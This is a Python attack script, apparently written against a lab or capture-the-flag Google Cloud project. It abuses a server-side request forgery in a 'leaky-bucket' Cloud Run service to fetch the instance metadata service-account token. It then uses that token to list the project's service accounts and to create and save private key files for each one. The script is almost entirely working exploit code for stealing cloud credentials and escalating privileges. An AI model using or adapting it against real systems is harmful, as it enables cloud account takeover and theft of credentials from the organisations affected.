import requests
import os 
import requests
import json
from bs4 import BeautifulSoup

def get_access_token():
    # Define URL and data for the POST request
    url = "https://leaky-bucket-jobztbckaq-uc.a.run.app/result"
    data = {
        "inputUrl": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
        "inputHeader": '{"Metadata-Flavor": "Google"}'
    }
    
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36"
    }

    response = requests.post(url, data=data, headers=headers)
    soup = BeautifulSoup(response.content, "html.parser")
    
    # Find the table cell with the token data
    token_data_cell = soup.find("td")
    if token_data_cell:
        # Parse the token JSON string and retrieve the 'access_token' field
        token_data = json.loads(token_data_cell.text.replace("&#34;", '"'))
        return token_data["access_token"]
    else:
        raise Exception("Unable to fetch token from the server's response.")

def get_privileged_access_token():
    # Define URL for the GET request
    url = "https://leaky-access-jobztbckaq-uc.a.run.app/result"
   
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.110 Safari/537.36"
    }

    response = requests.post(url, data={}, headers=headers)

    soup = BeautifulSoup(response.content, "html.parser")
    
    # Find the table cell (td) with the token data
    token_data_cell = soup.find("td")
    if token_data_cell:
        # Parse the token JSON string and retrieve the 'access_token' field
        token_data = json.loads(token_data_cell.text.replace("&#34;", '"'))
        return token_data["access_token"]
    else:
        raise Exception("Unable to fetch token from the server's response.")


def list_service_accounts(project_id, access_token):
    """
    List all service accounts for a given project ID.

    Args:
        project_id (str): The ID of the Google Cloud project.
        access_token (str): The access token for authentication.

    Returns:
        list: A list of service accounts.
    """
    
    endpoint = f"https://iam.googleapis.com/v1/projects/{project_id}/serviceAccounts"
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/json"
    }

    response = requests.get(endpoint, headers=headers)
    
    if response.status_code != 200:
        print("Error fetching service accounts:", response.json())
        return []
    
    service_accounts = response.json().get('accounts', [])
    
    return [sa['email'] for sa in service_accounts]

def create_service_account_key(sa_name):
    # Construct the API endpoint for creating a new key
    endpoint = f"https://iam.googleapis.com/v1/projects/{project_id}/serviceAccounts/{service_account_name}/keys"

    headers = {
        "Authorization": f"Bearer {access_token}",
        "Accept": "application/json",
        "Content-Type": "application/json"
    }

    # The body can be empty for the default key creation, but you can also specify keyAlgorithm and privateKeyType
    body = {
        "keyAlgorithm": "KEY_ALG_UNSPECIFIED",
        "privateKeyType": "TYPE_GOOGLE_CREDENTIALS_FILE"
    }

    try: 
        response = requests.post(endpoint, headers=headers, json=body)
        response_json = response.json()
        return response_json
    except Exception as e:
        print("Unable to create credentials for " + sa_name)
        return "{}"

def write_credential(sa_name, sa_content):
    with open("./accounts/" + sa_name + ".json", 'wb') as file:
        file.write(bytes(str(sa_content), "UTF-8"))
        file.close()


# Variables
project_id = 'optimal-jigsaw-390814'
access_token = get_access_token()
print(list_service_accounts(project_id, access_token))

service_accounts = ['leakybucket@optimal-jigsaw-390814.iam.gserviceaccount.com', 'leakysecret@optimal-jigsaw-390814.iam.gserviceaccount.com', '134663715059-compute@developer.gserviceaccount.com', 'leakyaccess@optimal-jigsaw-390814.iam.gserviceaccount.com', 'docker-pusher@optimal-jigsaw-390814.iam.gserviceaccount.com', 'optimal-jigsaw-390814@appspot.gserviceaccount.com']
service_account_name = 'leakysecret@optimal-jigsaw-390814.iam.gserviceaccount.com'

for sa_name in service_accounts:
    print("Creating key for " + sa_name)
    write_credential(sa_name, create_service_account_key(sa_name))